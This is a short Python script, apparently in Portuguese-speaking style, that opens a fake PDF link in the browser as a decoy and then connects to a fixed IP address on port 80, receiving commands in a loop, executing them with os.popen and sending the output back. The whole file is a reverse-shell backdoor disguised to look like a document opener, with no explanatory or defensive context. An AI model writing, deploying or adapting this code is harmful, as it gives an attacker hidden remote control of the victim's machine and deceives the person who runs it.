import socket,os

os.popen('explorer https://algumpdfonline.pdf')

ip = "192.168.0.200"
porta = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,porta))

while True:
      cmd = s.recv(1024)
      for comando in os.popen(cmd):
          s.send(comando)
